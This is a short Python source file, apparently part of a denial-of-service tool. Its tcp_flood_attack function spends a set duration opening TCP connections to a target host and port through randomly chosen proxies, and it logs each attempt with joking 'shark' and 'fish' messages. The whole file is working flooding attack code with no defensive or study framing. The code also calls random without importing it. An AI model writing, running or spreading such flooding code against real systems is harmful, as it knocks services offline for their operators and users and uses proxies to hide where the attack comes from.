import socket
import time
from utils.client_utils import TcpClient

def tcp_flood_attack(target, proxies, duration):
    host, port = target.split(":")
    port = int(port)
    end_time = time.time() + duration
    while time.time() < end_time:
        proxy = random.choice(proxies)
        sock = TcpClient.create_socket(proxy)
        try:
            sock.connect((host, port))
            print(f"🦈 Shark sent TCP packet on fish: {host}:{port} using {proxy['host']}:{proxy['port']}")
        except Exception as e:
            print(f"🐟 Oh No! The fish: {host}:{port} dodged the TCP packet which was sent from: {proxy['host']}:{proxy['port']} Try Again! {e}")
        finally:
            sock.close()
